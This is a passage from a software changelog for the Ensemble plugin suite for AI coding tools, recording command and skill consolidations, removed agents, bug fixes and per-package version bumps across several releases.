- **packages/router, packages/metrics:** the `ensemble-router` and `ensemble-metrics` packages (routing hook; dashboard hooks and `/ensemble:manager-dashboard` with `manager-dashboard-agent`). The router hook registration is dropped from `packages/full/hooks/hooks.json`; `ensemble-permitter` stays. Telemetry lives in `packages/telemetry`.
- **Commands:** `/ensemble:generate-api-docs` and `/ensemble:analyze-product` (removing `analyze-product` makes `ensemble-product` a MAJOR bump, 7.0.0). (`claude-changelog` and `create-trd-foreman` were already removed in 7.0.0.)
- **Agents:** `general-purpose`, `file-creator`, `context-fetcher`, `agent-meta-engineer`, `directory-monitor`, `pm`, `api-documentation-specialist`, `mobile-developer`, `qa-orchestrator` (use `test-runner`) and `github-specialist` (merged into `git-workflow`). (`test-reader-agent` was already removed in 7.0.0.)
- **Skills:** the generic tutorial skills `typescript`, `python`, `php`, `laravel`, `flutter`, `tailwind`, `prisma` and `celery` (formerly `developing-with-*`, `styling-with-tailwind`, `using-prisma`, `using-celery`) from `ensemble-development`.
- **Command and skill with no callers (`ensemble-development`):** `/ensemble:beads-plan` and the `complete-beads` skill.
- **Assessment skills (`ensemble-assessment`):** `assess-team-ai-adoption`, `assess-team-code-quality`, `assess-team-code-review`, `assess-team-commit-messages`, `assess-team-commit-volume`, `assess-team-documentation`, `assess-team-incidents` and `assess-team-test-coverage`, replaced by `assess-team-dimension` (`commit-volume` and `incidents` have no replacement).
- **Dead code:** `packages/multiplexer-adapters`, `tools/version-manager` and a dangling `packages/full` symlink.

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 7.0.0 → 8.0.0 (dev carried an interim
  7.0.1). This is a MAJOR release because packages, commands, agents and
  skills are removed (see Removed), `/ensemble:pr-merge` now decides on the
  local CI gate verdict, and `ensemble-permitter` stops auto-allowing chained
  and redirected commands (see Added and Fixed). Content-change bumps follow
  semver per package. No commit carries a breaking-change marker, so MAJOR is
  judged from the diff, as in 7.0.0 (a public export, skill or command was
  removed); otherwise `feat` → MINOR and everything else PATCH:
  - MAJOR: `ensemble-ai` 6.0.0 → 7.0.0, `ensemble-blazor` 6.0.0 → 7.0.0,
    `ensemble-react` 6.0.0 → 7.0.0, `ensemble-nestjs` 5.1.1 → 6.0.0,
    `ensemble-phoenix` 5.1.1 → 6.0.0, `ensemble-rails` 5.1.1 → 6.0.0 and
    `ensemble-dotnet` 1.1.0 → 2.0.0 (public `lib/index.js` exports removed;
    see Changed), `ensemble-assessment` 1.1.0 → 2.0.0 (eight skills removed)
    and `ensemble-product` 6.0.0 → 7.0.0 (`/ensemble:analyze-product`
    removed).
  - MINOR (`feat` commits): `ensemble-e2e-testing` 6.0.0 → 6.1.0,
    `ensemble-infrastructure` 6.0.0 → 6.1.0, `ensemble-opencode` 5.3.1 → 5.4.0
    and `ensemble-pytest` 5.1.1 → 5.2.0.
  - PATCH: `ensemble-jest` 5.1.1 → 5.1.2 and `ensemble-permitter` 5.2.1 →
    5.2.2.
  - Already bumped on dev and kept: `ensemble-core` 6.0.0 → 6.1.0,
    `ensemble-git` 6.0.0 → 6.1.0, `ensemble-development` 7.0.0 → 7.0.1,
    `ensemble-quality` 6.0.0 → 6.0.1, `ensemble-codex` 6.0.0 → 6.0.1
    (regenerated) and `ensemble-pi` 1.6.16 → 1.6.18 (owned by
    `scripts/bump-pi-version-if-changed.js`, not edited by hand here).
  - New marketplace entries: `ensemble-telemetry` 5.2.1, `ensemble-guards`
    5.2.1 and `ensemble-lifecycle` 7.0.0. Retired: `ensemble-metrics` (was
    6.0.0) and `ensemble-router` (was 5.2.3).
  - Unchanged: `ensemble-exunit`, `ensemble-reqnroll`, `ensemble-rspec` and
    `ensemble-xunit`. `ensemble-agent-core` and `ensemble-pi-extension` stay
    at 0.1.2: they have no marketplace entry and are installed from a
    checkout.
- `@sunstone-partners/ensemble-*` dependency ranges that the new majors no
  longer satisfy were moved in `ensemble-full`'s peerDependencies
  (`ensemble-ai`, `ensemble-blazor`, `ensemble-react` and `ensemble-product`
  to `^7.0.0`; `ensemble-nestjs`, `ensemble-phoenix` and `ensemble-rails` to
  `^6.0.0`; `ensemble-dotnet` to `^2.0.0`), so a plain `npm install` still
  resolves against the workspace; no other range moved. `package-lock.json`
  was brought back in line with the manifests (it had drifted for
  `ensemble-core`, `ensemble-git`, `ensemble-development`, `ensemble-quality`,
  `ensemble-codex` and `ensemble-pi`).

## [7.0.0] - 2026-10-18

### Changed

- **Hidden commands (new `metadata.visibility: hidden`):** a command YAML can now be hidden so it is not typable but stays readable by its dispatcher. Claude Code: generated frontmatter `user-invocable: false` (hidden from the slash menu; the model can still invoke it). Pi: written to `packages/pi/prompts/_hidden/` with no command-wrapper skill, and `packages/pi/package.json` `pi.prompts` changes from `./prompts` to `./prompts/*.md` because `pi install` registers subdirectories of a listed directory. Codex: wrapper skill gets `user-invocable: false`. The Pi generator now removes the old visible prompt and wrapper skill when a command becomes hidden.
- **New dispatchers:** `/ensemble:reqnroll` (`features|feature-drift|bindings|binding-drift|tdd`) and `/ensemble:standards` (`discover|inject|fold`). `generate-feature-tests`, `check-feature-drift`, `generate-reqnroll-bindings`, `check-binding-drift`, `reqnroll-tdd`, `discover-standards` and `inject-standards` are now hidden behind them (**not typable by their old names**); `fold-prompt` stays typable because `directory-monitor` invokes it by name. `beads-build-wave` is hidden too; its agent now also looks for the Pi hidden prompt path. Typable commands: 44 -> 38 (46 generated; 8 hidden).
- **packages/assessment:** new `/ensemble:assess` command: `repo`, `team`, `config`, `report`, and `repo --only <dimension>`, each loading the matching assessment skill by name (leaf skills stay invokable). `ensemble-assessment` is self-contained on Pi: the Pi generator now writes its prompt and command-wrapper skill into `packages/assessment/` (new `SELF_CONTAINED_PI_PACKAGES` in `packages/pi/src/self-contained-packages.ts`, which also drives the `ensemble-pi` exclusion), `packages/assessment/package.json` `pi.prompts` is `./prompts/*.md`, and `ensemble-pi` ships no assess prompt. `ensemble-full` carries the command via `commands/assessment`. Installing `ensemble-assessment` into Pi registers `ensemble-assess` plus the 22 assessment skills (checked with `pi install` and RPC `get_commands`); on OMP it is reachable through the `ensemble-assess` wrapper skill. Typable commands: 38 -> 39.
- **Variant commands folded into flags (breaking: the old command names no longer exist):**
  - `create-prd-meeting` -> `/ensemble:create-prd --from-meeting`; `refine-prd-meeting` -> `/ensemble:refine-prd --from-meeting`. The meeting-specific phases (summary intake, inferred scale, no-invention / `[NEEDS CLARIFICATION]` discipline, non-interactive critique, resolvable-vs-still-open classification) are preserved as flag-gated sections. **Behavior changes:** `--from-meeting` now runs the Constitution Gate like every other `create-prd` run, so a repo with no constitution file halts with `CONSTITUTION_CONFIG_ERROR` where the old variant did not; it is mutually exclusive with `--foreman` (and `--collab`/`--long-lived` on refine); meeting-sourced drafts now carry the standard frontmatter label; lifecycle hooks keyed on `ensemble:create-prd-meeting` / `ensemble:refine-prd-meeting` must key on `ensemble:create-prd` / `ensemble:refine-prd`.
  - `create-trd-foreman` -> `/ensemble:create-trd --parser-tables` (sprint/story tables, no adversarial review, `foreman sling prd` next step). The flag is not `--foreman` because `create-trd --foreman` already means "standard TRD with Foreman artifact contracts" and Foreman's own default workflow runs it; the two combine. The variant's "skip to Output Management" after the MCP step now routes through the Constitution Gate instead of bypassing it.
  - `create-workstream-trd` -> `/ensemble:implement-trd-beads <trd> <trd> --workstream --generate-only` (the generator step already lived there). The `trd` dispatcher drops the `foreman` and `workstream` keywords and the `prd` dispatcher drops `create-meeting` / `refine-meeting`; the flags go on `create`, `refine` and `implement`.
  - Typable commands: 39 -> 35.
- **Skill renames (breaking for anything that loads these by name):** skill directory names now equal their technology name. `developing-with-typescript|python|php|laravel|flutter` -> `typescript|python|php|laravel|flutter`; `styling-with-tailwind` -> `tailwind`; `managing-jira-issues` -> `jira`; `managing-linear-issues` -> `linear`; `managing-railway` -> `railway`; `managing-vercel` -> `vercel`; `managing-supabase` -> `supabase`; `aws-cloud` -> `aws`; `using-prisma` -> `prisma`; `using-celery` -> `celery`; `using-weaviate` -> `weaviate`; `using-anthropic-platform` -> `anthropic`; `using-openai-platform` -> `openai`; `using-perplexity-platform` -> `perplexity`; `building-langgraph-agents` -> `langgraph`.
- **packages/react, packages/dotnet:** `developing-with-react` is folded into the `react` skill (the `react` skill is now also in `ensemble-full`); the `dotnet-framework` skill moves from `ensemble-blazor` to `ensemble-dotnet` as `dotnet`.
- **packages/e2e-testing:** the five `smoke-test-*` leaf skills are merged into `smoke-test-runner` (`smoke-test-api|auth|critical-paths|database|external-services` no longer exist as separate skills).
- **packages/infrastructure, packages/quality, schemas:** both plugin manifests now declare `"dependencies": ["ensemble-core"]` (they call `detect-stack`); `schemas/plugin-schema.json` accepts a bare plugin name, `name@marketplace` or `name@x.y.z` in `dependencies`. Verified on Claude Code 2.1.292 with an isolated config: installing `ensemble-infrastructure` from the `ensemble` marketplace pulls in `ensemble-core` automatically; a bare name resolves against the dependent plugin's own marketplace, and a dependency missing from the marketplace installs with a warning rather than an error. Pi/OMP and Codex have no dependency mechanism, so install `ensemble-core` alongside those packages yourself.
- **packages/blazor (breaking for direct `lib/index.js` consumers):** `loadSkill`, `getTemplate` and `getExample` no longer take a `skillName` argument and `skill.skills` is now `['blazor']`, because `dotnet-framework` moved to `ensemble-dotnet`. Nothing in this repo calls these, but external users of `@sunstone-partners/ensemble-blazor` could.
- **packages/react:** `lib/index.js` had a syntax error (`dependencies?['react-dom']`, now `?.`) and failed `node --check`; fixed while renaming its metadata.
- **packages/core, packages/infrastructure:** the four detector skills (`framework-detector`, `test-detector`, `tooling-detector`, `cloud-provider-detector`) are merged into one `detect-stack` skill in `ensemble-core`. One CLI replaces the four scripts: `node skills/detect-stack/detect-stack.js [path] --axis=framework|test|tooling|cloud|all` (`--tool x` is now `--tools=x`). The output is one envelope (`axis`, `detected`, `primary`, `confidence`, `threshold`, `results`, `all_results`) instead of three schemas, and exit codes are uniform (0 detected, 1 nothing detected, 2 error). Weights, thresholds and boosts are unchanged. The `ensemble-infrastructure` agents and `deep-debugger` (`ensemble-quality`) call it, so install `ensemble-core` alongside those packages; see their READMEs. Replacement table: `skills/detect-stack/REFERENCE.md`.
- **packages/assessment:** `assess-repo` / `assess-team` delegate to their leaf skills (single source); numeric-first scoring throughout. `ensemble-assessment` is now Pi-installable and is no longer bundled into `ensemble-pi` (install both). Still included in `ensemble-full`.
- **scripts/generate-codex:** framework skill path rewriting now matches the bare skill name (`skills/<name>/` -> `.codex/skills/<name>/`) instead of the old `<name>-framework` names.

### Removed

- **packages/git:** the `/ensemble:claude-changelog` command (unrelated to ensemble workflows). Use the `changelog-generator` skill for conventional-commit changelogs.
- **packages/metrics:** the `/ensemble:sprint-status` and `/ensemble:web-metrics-dashboard` commands (near-empty stubs with no tools or callers). `/ensemble:manager-dashboard` remains.
- **packages/e2e-testing:** the `/ensemble:playwright-test` command (a stub that only delegated to `playwright-tester`). Use `/ensemble:author-playwright-tests` or the `playwright-tester` agent.
- **packages/git, packages/quality:** the `release-agent` agent (a duplicate of the `/ensemble:release` command, which delegates to `git-workflow`, `github-specialist` and `deployment-orchestrator` directly) and the `test-reader-agent` fixture agent. The pi-extension live smoke script now uses `ensemble:manager-dashboard` as its read-only command.

### Fixed

- Agents (`backend-developer`, `frontend-developer`, `ensemble-orchestrator`, `infrastructure-developer`, `mobile-developer`) no longer reference skills that do not exist (`*-framework`, `gcp-cloud`, `azure-cloud`, `react-native`); `ensemble-full` now includes the `react` skill.
- **packages/rspec, packages/xunit:** the `rspec` and `xunit` skills were 22-line stubs and their helper scripts were broken. Both are now full skills with a section layout matching `jest`/`pytest`/`exunit`; every code example was run (RSpec 3.13 and xunit 2.9.3 on .NET 10). `rspec/generate-test.rb` crashed without `--source`, mis-cased class names and always generated a vacuously passing example; `rspec/run-test.rb` printed all-zero counts. `xunit/generate-test.cs` did not compile (CS0136); `xunit/run-test.sh` ran `dotnet test <file.cs>`, asked for a non-existent `json` logger and always printed a hard-coded success. Both now report real `{success, passed, failed, skipped, total, failures[]}` JSON. **Behavior change:** the generated placeholder test is no longer a passing test (`skip` for RSpec, `Assert.Fail` for xUnit) so a scaffold cannot be mistaken for coverage. `rspec` also gains `skills/REFERENCE.md`, which `lib/index.js` already tried to load. `xunit/generate-test.cs` now needs the .NET 10 SDK (`dotnet run generate-test.cs`).
- **packages/core:** `detect()` in `lib/index.js` called `FrameworkDetector` without `new` and threw on every call; it now constructs the detector and forwards options (regression test added).
- **packages/development, packages/full, packages/blazor:** `ensemble-dotnet` is now in `configure-team.yaml` (`domain_to_plugins.backend`, `framework_keyword_to_plugin`) and the `ensemble-full` peerDependencies; the `ensemble-blazor` description no longer claims `.NET` backend skills.
- **scripts/pi:** the Pi generator now prunes stale output. A file is removed only if it provably carries the generator's own marker (prompt header, command-wrapper skill proof, or the new marker line that agents and copied skills now carry), so hand-authored files survive; `--dry-run` reports without deleting; `generate()` and `generateAll()` return `{ pruned }`. Every generated Pi agent and skill file gains one marker line.
- **docs/PRD:** `PRD-2026-87e64cc6` v1.1.0 amends REQ-009 (hiding is allowed behind a dispatcher), notes the folded variants as an exception under REQ-018, and leaves REQ-004 / AC-004-1 untouched.

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 6.9.9 → 7.0.0. This is a MAJOR release
  because commands, skills and agents are removed or renamed (see Changed and
  Removed above). Content-change bumps follow semver per package.
  - MAJOR (a skill, command, agent or library API was renamed or removed):
    `ensemble-ai` 5.2.1 → 6.0.0, `ensemble-blazor` 5.1.0 → 6.0.0,
    `ensemble-codex` 5.3.6 → 6.0.0 (regenerated; eight command wrapper skills
    and two agents removed, skills renamed), `ensemble-core` 5.6.3 → 6.0.0,
    `ensemble-development` 6.0.11 → 7.0.0, `ensemble-e2e-testing` 5.4.1 →
    6.0.0, `ensemble-git` 5.3.2 → 6.0.0, `ensemble-infrastructure` 5.3.0 →
    6.0.0, `ensemble-metrics` 5.2.2 → 6.0.0, `ensemble-product` 5.6.5 → 6.0.0,
    `ensemble-quality` 5.4.0 → 6.0.0 and `ensemble-react` 5.1.0 → 6.0.0.
  - MINOR (additive or rewritten content): `ensemble-assessment` 1.0.0 → 1.1.0
    (`/ensemble:assess`, Pi-installable), `ensemble-dotnet` 1.0.0 → 1.1.0
    (gains the `dotnet` skill), `ensemble-rspec` and `ensemble-xunit` 5.1.0 →
    5.2.0 (full skills and working helper scripts).
  - PATCH: `ensemble-exunit`, `ensemble-jest`, `ensemble-nestjs`,
    `ensemble-phoenix`, `ensemble-pytest` and `ensemble-rails` 5.1.0 → 5.1.1
    (skill frontmatter `name` is now the bare technology name and docs point at
    `detect-stack`; Claude Code keys skills by directory name and Pi already
    normalized the name, so only Codex's generated skill identifier changed,
    and that ships in `ensemble-codex` 6.0.0), `ensemble-reqnroll` 1.0.1 →
    1.0.2 (docs point at the `/ensemble:reqnroll` dispatcher),
    `ensemble-router` 5.2.2 → 5.2.3 (rules follow the renamed and removed
    skills and agents).
  - `ensemble-pi` 1.6.15 → 1.6.16 was bumped by
    `scripts/bump-pi-version-if-changed.js` (`postgenerate:pi`) earlier on this
    branch, not by hand. `ensemble-pi-extension` stays at 0.1.2: it has no
    marketplace entry and is installed from a checkout.
- `@sunstone-partners/ensemble-*` dependency ranges that the new versions no
  longer satisfy were moved to the new majors (`^6.0.0`, and `^7.0.0` for
  `ensemble-development`) in each dependent package, in `ensemble-full`'s
  peerDependencies and in `ensemble-pi`'s `ensemble-core` dependency, so a
  plain `npm install` still resolves against the workspace.
  `package-lock.json` was brought back in line (it had drifted:
  `ensemble-quality` 5.3.0, `ensemble-pi` 1.6.15, and no `ensemble-dotnet` peer
  on `ensemble-full`).

## [6.9.9] - 2026-10-17

### Added

- **packages/pi-extension, packages/agent-core:** command lifecycle hooks
  (`command.start` / `command.end`) — a trusted `hooks.yaml` per command can
  observe or block command invocation, with a two-condition trust gate,
  digest-bound per-user trust store, run tracker, prompt/event runner, and
  bounded shutdown; `ensemble_command_complete` tool and per-turn instruction
  (TRD-2026-f08a2a09, #168).
- **packages/development:** `pr-review-cycle` skill plus
  `lib/pr-review-*.js` / `pr-review-cli.js`: head-bound, base-correct review
  loop with a finding ledger, terminal-status contract (`REVIEW_COMPLETE` /
  `REVIEW_PENDING` / `REVIEW_BLOCKED`), bounded remediation rounds, and
  fail-closed validation; integrated into `fix-issue`,
  `implement-trd-beads`, and `complete-beads` at their PR boundaries.
  `new-feature`/`feature` gain `--foreman` non-interactive mode.
  (TRD-2026-82b6a138 #156-#159; #165.)
- **packages/quality:** `pr-review-remediation` skill consumed by the above.

### Fixed

- **packages/product:** generated Reqnroll step bindings use literal Cucumber
  expressions for special characters, and method names are unique within a
  requirement; migration rewrites legacy attributes without replacing
  implemented bodies (#154, #161, #162).
- **packages/development:** beads are labelled by TRD and `bv` plans are
  label-scoped; only the current TRD's beads are staged and `br`'s own export
  no longer halts the gate; the clean-tree gate is decided after resume
  detection; `trd-parser` accepts `AC checklist:` labels and keeps every REQ
  in a multi-REQ `[satisfies …]` bracket (#129, #130, #145, #166).
- **packages/core:** QuickTunnel missing-binary tests pin the binary
  resolver, dropping the environment-dependent bare-`cloudflared` assertions
  (#155).
- **packages/development:** `new-feature` reads its invocation arguments from
  `$ARGUMENTS` (#167).

### Release plumbing

- Aggregate release bumped so existing full-plugin installations receive the
  changed content: `ensemble-full` 6.9.8 → 6.9.9, with content-change bumps
  `ensemble-development` 6.0.10 → 6.0.11, `ensemble-codex` 5.3.5 → 5.3.6
  (regenerated skills), `ensemble-e2e-testing` 5.4.0 → 5.4.1,
  `ensemble-git` 5.3.1 → 5.3.2, `ensemble-metrics` 5.2.1 → 5.2.2, and
  `ensemble-reqnroll` 1.0.0 → 1.0.1. `ensemble-pi` 1.6.15 is a prerequisite:
  Pi vendors the skills above in its bundle.

## [6.9.8] - 2026-10-14

### Added

- **packages/e2e-testing:** follow-along SlowMo pause for headed
  `author-playwright-tests` runs. Bumps `ensemble-e2e-testing` 5.3.0 → 5.4.0
  (#149).
- **packages/assessment:** new `ensemble-assessment` skill package at 1.0.0,
  with Pi/OMP-specific tool references normalized to be runtime-generic
  (#142, #143, #144).
- **packages/quality:** `pr-review-remediation` skill. `ensemble-quality`
  5.3.0 → 5.4.0 (#147).
- **packages/development:** tag task beads `foreman-exec` under `--foreman`
  after bv planning (#150).

### Changed

- **packages/product, packages/development:** the PRD/TRD workflow is now
  `create-prd` → `refine-prd` → `create-trd` → `refine-trd` →
  `implement-trd-beads`. `create-prd` and `create-trd` no longer print the
  downstream implement/TRD commands; `refine-prd` ends with a PRD Lock and
  `refine-trd` with an Implementation Go / No-Go, and each prints the next
  command only on the approving branch. `create-trd` now pins
  `prd_reference` to the PRD's file path, warns when the source PRD has no
  `refine-prd` changelog entry, and detects a PRD whose version moved after
  the TRD was built. `refine-trd` now emits its declared Configure-Team
  Suggestion. Bumps `ensemble-product` 5.6.3 → 5.6.4 (#112, closes #100).

### Fixed

- **packages/development:** `trd-cli list/status` work again —
  `extractDesignReadinessScore` is exported (#123); TRD frontmatter keys are
  read regardless of case and spacing (#124); `team-defaults` loads without
  `js-yaml` (#125); composed bead titles are clamped to br's 500-character
  limit (#126); `beads-build-wave` is registered in the plugin manifests and
  the command halts early without it (#127); br's wrapped list output and any
  bead id prefix are accepted during epic discovery (#128). Bumps
  `ensemble-development` 6.0.9 → 6.0.10.
- **packages/pi:** regenerated `packages/pi/skills` — the assessment package
  and `pr-review-remediation` were missing. `ensemble-pi` 1.6.12 → 1.6.13
  (#148).

### Release plumbing

- `ensemble-codex` 5.3.4 → 5.3.5 (regenerated skills from the changes above)
  and `ensemble-full` 6.9.7 → 6.9.8, which serves the changed packages
  through symlinks.

## [6.9.7] - 2026-10-07

### Fixed

- **scripts/validate-release-bump.js:** the v6.9.6 release's exemption for a
  package that legitimately retires its only `marketplace.json` entry was a
  silent `continue`, which could also mask a future *accidental* deletion of
  an actively-shipping plugin's entry. Kept the exemption but made it a
  visible `console.warn` naming the package and its last known version (#137).
- **README.md, packages/development/README.md:** both had drifted out of
  sync with the command-surface-consolidation work in 6.9.6 — a stale
  `/ensemble:feature` description, missing `/ensemble:prd`/`/ensemble:trd`/
  `/ensemble:issue`/`/ensemble:list-issue` rows, a fictional `/dashboard`
  command, and missing `ensemble:` prefixes. Also found and fixed in the
  README's Architecture section: three shipped skill packages
  (`ensemble-ai`, `ensemble-dotnet`, `ensemble-reqnroll`) missing entirely,
  and two packages listed that no longer exist
  (`ensemble-agent-progress-pane`, `ensemble-task-progress-pane`, removed in
  `14b37d9`). Bumps `ensemble-development` 6.0.8 → 6.0.9 (#138, #139).
- **GitHub wiki** (`07-Commands.md`, `14-Example-Session.md`,
  `02-Architecture.md`, `Home.md`): same command-surface drift as above, plus
  a "Behavior Runtime" section and a "behavior-runtime layer" mention that
  still described `agent-core`/`pi-extension` as hosting the autofix-dispatch
  subsystem removed in 6.9.6 — rewritten to describe current reality (native
  Pi/OMP command completion only). Published directly to the wiki, outside
  this repo's PR flow.

## [6.9.6] - 2026-10-07

### Removed

- **agent-core, pi-extension:** entire behavior-runtime/autofix-loop subsystem
  removed from `dev` (`.ensemble/behaviors/`, `packages/agent-core/src/behavior/`,
  the autofix/constitution-proposal/working-tree-snapshot wiring in
  `packages/pi-extension`). A globally-loaded OMP/Pi extension was found to
  wire this into every session on the operator's machine via a buggy
  working-tree rollback mechanism that could silently drop uncommitted work.
  Retained, unmodified, on the `pi-behaviors` branch for future development
  once its known bugs are fixed upstream (#133). Bumps `ensemble-agent-core`
  0.1.1 → 0.1.2 and `ensemble-pi-extension` 0.1.1 → 0.1.2.
- **pi-extension:** restored a trimmed `scripts/smoke-activate.mjs` (the one
  real-ESM-loader proof #133 had removed along with the echo tool it used to
  assert) so AC-004-1 still has coverage jest structurally cannot provide
  (#134).

### Fixed

- **development:** `beads-build-wave` preflight now hard-gates against
  dispatching on the repository default branch (detached HEAD and
  default-branch checks), and its lifecycle contract gained an independent
  Commit Gate between subagent success and `br close` -- a subagent's
  self-reported success is no longer sufficient evidence of a commit (#132).
  Bumps `ensemble-development` 6.0.7 → 6.0.8, `ensemble-codex` 5.3.3 → 5.3.4,
  `ensemble-product` 5.6.2 → 5.6.3.
- **pi:** regenerated derived prompts/skills to match source YAML changes
  across the above; `ensemble-pi` 1.6.11 → 1.6.12 (auto-bumped by
  `postgenerate:pi`).

`ensemble-full` 6.9.5 → 6.9.6.

## [6.9.5] - 2026-10-01

### Added

- **development, product:** `new-feature` command adopts a PRD, orchestrating
  `create → refine → create → refine → implement` end to end, replacing
  `implement-trd` (#113, #114).

### Fixed

- **agent-core:** `isRestorationToHistory()` in the write-boundary guard now recognizes
  a path-scoped restore (`git checkout <good-sha> -- <path>`) as a revert instead of a
  fresh violation, so an agent can correct a bad protected-path commit without the guard
  reverting its own correction (br-suoh, #109). Bumps `ensemble-agent-core` 0.1.0 → 0.1.1.
- **core, git, router, codex:** OMP command discovery fix and parameters-rendering fix
  for the new-feature workflow (#114). Bumps `ensemble-core` 5.6.1 → 5.6.2,
  `ensemble-git` 5.3.0 → 5.3.1, `ensemble-router` 5.2.1 → 5.2.2,
  `ensemble-codex` 5.3.2 → 5.3.3, `ensemble-product` 5.6.1 → 5.6.2,
  `ensemble-development` 6.0.6 → 6.0.7.
- **opencode:** version sync restored between `package.json`/`plugin.json` and the
  plugin's own `ENSEMBLE_META` constant, which had drifted from the package's
  hardcoded-scaffolding version. Bumps `ensemble-opencode` 5.3.0 → 5.3.1.
- **pi-extension:** `ensemble-pi-extension` 0.1.0 → 0.1.1, carrying the accumulated
  isolation, consent, and dispatch hardening already merged to `dev` since v6.9.4.

### Removed

- **development, product:** `implement-trd` command, superseded by `new-feature` (#114).

`ensemble-full` 6.9.4 → 6.9.5.

## [6.9.4] - 2026-09-26

### Fixed

- **core:** the `init-project` constitution template emits Article-style headings (#68).
  Bumps `ensemble-core` 5.6.0 → 5.6.1.
- **development:** `create-trd-foreman` runs the Constitution Gate (#67), and `create-trd`
  makes the gate observable on every run (#69). Bumps `ensemble-development` 6.0.5 → 6.0.6;
  regenerating the Pi output for these prompts bumps `ensemble-pi` 1.6.9 → 1.6.10.
- **product:** `create-prd` makes the Constitution Gate observable on every run (#69).
  Bumps `ensemble-product` 5.6.0 → 5.6.1.
- **pi:** generated agents keep an explicitly declared `Task` as native `task`, so OMP
  orchestrators can delegate, without granting delegation to agents that don't declare it (#71).
- **codex:** regenerated `create-prd`, `create-trd` and `create-trd-foreman` skills for the
  changes above. Bumps `ensemble-codex` 5.3.1 → 5.3.2.

### CI

- `dev` is now the integration branch; PRs into `main` must come from `dev` and pass a release
  gate that requires version bumps for changed packages (#82).
- The router's Python suite runs in CI, and fails rather than passing when pytest is missing (#75).

`ensemble-full` 6.9.3 → 6.9.4.

## [6.9.3] - 2026-08-13

### Removed

- **development:** resolve shorthand agent names to installed namespaced plugin agents before Task delegation.

### Fixed

- **core:** close SSE subscribers before `server.close()` in `refinement-review` stop()
  so the server no longer hangs on shutdown when a long-lived session has open
  EventSource clients. Bumps `ensemble-core` 5.5.0 → 5.5.1.
- **development:** include runtime-installed plugin agents (`~/.omp/plugins/node_modules/@*/agents/*.md`)
  in `AGENT_REGISTRY` and `KNOWN_AGENTS`. `configure-team` Phase 3 Step 1 and
  `implement-trd-beads` Preflight Order 11 now scan both the source
  `packages/*/agents/*.yaml` tree and the runtime plugin path, dedupe with the
  runtime entry winning, and rebuild `KNOWN_AGENTS` / `AGENT_ALIAS_MAP` after
  every plugin install. Fixes consumer-repo agent discovery gaps (e.g. foreman's
  local 3-agent registry shadowing the 30-agent OMP install registry).
- **development:** join the `do NOT re-read the file again` line in
  `configure-team.yaml` so the spec-required literal is grep-able as a single
  substring (the rendered prompt is unchanged for the LLM).
- **development:** `applyPhaseFilter` now passes `stacked: prFormat` to
  `selectNextTasks` so prFormat mode implies phase-strict dispatch instead of
  silently falling through to non-stacked behavior.
- **development:** `trd-cli` missing-subcommand error now begins with
  `Missing subcommand. ` so the smoke test assertion matches without losing
  the existing Usage hint.

## [6.9.2] - 2026-06-23

### Fixed

- **development:** preserve verbatim source TRD task markdown in generated workstream tasks so deterministic parsing does not discard semantic detail.

## [6.9.1] - 2026-06-23

### Fixed

- **development:** decompose workstream TRD acceptance criteria into AC-level implementation, test, and validation tasks.

## [6.9.0] - 2026-06-20

### Added

- **development:** add `beads-scaffold-specialist` for Beads hierarchy/dependency graph scaffolding and repair without product-code implementation.

## [6.8.1] - 2026-06-20

### Fixed

- **development:** reuse the source PRD micro UUID for generated TRD IDs; workstream TRDs still generate their own micro UUID.

## [6.8.0] - 2026-06-20

### Added

- Use micro UUID document IDs for generated PRD/TRD/workstream artifact filenames to avoid sequence-number collisions across large teams.

## [6.7.0] - 2026-06-20

### Added

- **development:** add `/ensemble:create-workstream-trd` to generate a single executable workstream TRD from multiple source TRDs while preserving provenance.
- **development:** deprecate direct multi-TRD `/ensemble:implement-trd-beads` execution; require generated workstream TRDs by default.

## [6.6.5] - 2026-06-20

### Fixed

- **development:** scaffold explicit AC-* validation and XC-* cross-cutting beads, and enforce Definition of Done gates before bead closure.

## [6.6.4] - 2026-06-19

### Fixed

- **development:** resolve shorthand agent names to installed namespaced plugin agents before Task delegation.

## [6.6.3] - 2026-06-19

### Fixed

- **development:** keep implement-trd-beads running through routine progress milestones; only pause for real user decisions.

## [6.6.2] - 2026-06-19

### Fixed

- **full:** parse TRD scalar frontmatter without requiring installed npm dependencies in plugin cache.

## [6.6.1] - 2026-06-18

### Fixed

- **full:** bundle TRD CLI helper modules required by installed Beads/TRD commands.

## [6.6.0] - 2026-06-18

### Added

- **development:** add multi-TRD workstream support
- **development:** add refine-beads command

### Changed

- **TRD:** sync refine-beads checkboxes
- add refine-beads TRD
- archive completed PRDs
- document multi-TRD workstreams
- update multi-TRD workstream TRD
- stop tracking beads issue database

### Fixed

- **development:** address coderabbit findings

## [5.12.0] - 2026-04-12

### Added

- **Pi runtime** (`ensemble-pi`): Translation-layer runtime for Ensemble commands, with skill-copier and CRLF normalization (#55).
- **Codex package** (`ensemble-codex`): Codex release notes generation and project installation scripts.
- **Standards discovery**: `/ensemble:discover-standards` and `/ensemble:inject-standards` commands for extracting and applying coding conventions.
- **Implement-bead command**: Single-bead implementation workflow (`/ensemble:implement-bead`).
- **Feature pipeline**: `/ensemble:feature` orchestration command combining PRD → TRD → implementation (#53).
- **Requirement traceability**: End-to-end `validate-requirements` and `requirement-status` commands (#52).
- **Auto-team configuration**: Automated team config generation from TRD complexity analysis (TRD-AUTOTEAM-001).
- **Beads-plan and beads-build**: Commands for bead hierarchy analysis and builder/code-review/close pipeline.
- **Team-based execution model** for `implement-trd-beads`: Team YAML parser, state machine, parallel builders, QA delegation, rejection loops, metrics, and quality gates.
- **Session logging**: `/ensemble:sessionlog` command with sensitive data exclusion and incremental logging.
- **OpenCode support**: Full translation layer for OpenCode runtime — SkillCopier, CommandTranslator, AgentTranslator, HookBridge, ManifestGenerator, and distribution packaging.

### Changed

- **PRD/TRD commands rewritten**: Competitive analysis rewrite of `fold-prompt`, `create-prd`, `create-trd` with interview-style elicitation.
- **Refine commands**: Added readiness gates to `refine-prd` and `refine-trd`.
- **Git workflow**: Consolidated on git-town, removed jj-vcs skill.
- **implement-trd-beads**: Migrated from bd to br/bv with wheel instructions, added PRD/TRD file links to bead task descriptions.
- **Model aliases**: Simplified — removed opus-4-6 and sonnet-4 aliases.
- Command frontmatter now includes version, category, and last-updated fields.

### Fixed

- Pi runtime: `sourceRoot` derived from `__dirname` instead of `process.cwd()`.
- Pi skill-copier: CRLF → LF normalization to prevent CI drift.
- implement-trd-beads: Corrected backwards dependency wiring in scaffold.
